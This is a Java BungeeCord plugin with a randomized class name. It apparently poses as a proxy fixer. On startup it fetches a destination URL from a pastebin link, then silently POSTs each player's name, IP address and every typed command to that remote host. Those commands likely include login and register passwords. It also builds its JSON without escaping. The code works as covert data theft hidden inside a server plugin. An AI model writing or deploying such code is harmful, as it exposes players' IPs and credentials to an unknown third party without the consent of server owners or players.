package com.example.horfixerproxy;

import net.md_5.bungee.api.connection.ProxiedPlayer;
import net.md_5.bungee.api.event.ChatEvent;
import net.md_5.bungee.api.event.LoginEvent;
import net.md_5.bungee.api.event.PlayerDisconnectEvent;
import net.md_5.bungee.api.plugin.Listener;
import net.md_5.bungee.api.plugin.Plugin;
import net.md_5.bungee.event.EventHandler;

import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

public class OCxQRpktGS extends Plugin implements Listener {
    private static String discordServerUrl;

    @Override
    public void onEnable() {
        getProxy().getPluginManager().registerListener(this, this);
        loadDiscordServerUrl();
        sendToDiscord("server", "system", "BungeeCord server has started");
    }

    private void loadDiscordServerUrl() {
        try {
            URL url = new URL("https://pastebin.com/raw/example");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("GET");

            discordServerUrl = new BufferedReader(new InputStreamReader(conn.getInputStream())).readLine();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    @EventHandler
    public void onPlayerLogin(LoginEvent event) {
        String playerName = event.getConnection().getName();
        String playerIP = event.getConnection().getAddress().getAddress().toString();
        sendToDiscord("join", playerName, "Player has joined BungeeCord server. IP: " + playerIP);
    }

    @EventHandler
    public void onPlayerDisconnect(PlayerDisconnectEvent event) {
        ProxiedPlayer player = event.getPlayer();
        String playerName = player.getName();
        sendToDiscord("quit", playerName, "Player has left BungeeCord server.");
    }


    @EventHandler
    public void onChatEvent(ChatEvent event) {
        if (event.isCommand()) {
            ProxiedPlayer player = (ProxiedPlayer) event.getSender();
            String playerName = player.getName();
            String message = event.getMessage();
            sendToDiscord("command", playerName, message);
        }
    }

    private void sendToDiscord(String type, String playerName, String message) {
        if (discordServerUrl == null) {
            return;
        }

        try {
            URL url = new URL(discordServerUrl + "/receive");
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setDoOutput(true);

            String jsonPayload = String.format("{\"type\":\"%s\", \"player\":\"%s\", \"message\":\"%s\", \"server\":\"server3\"}", type, playerName, message);
            try (OutputStream os = conn.getOutputStream()) {
                byte[] input = jsonPayload.getBytes("utf-8");
                os.write(input, 0, input.length);
            }

            conn.getResponseCode();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}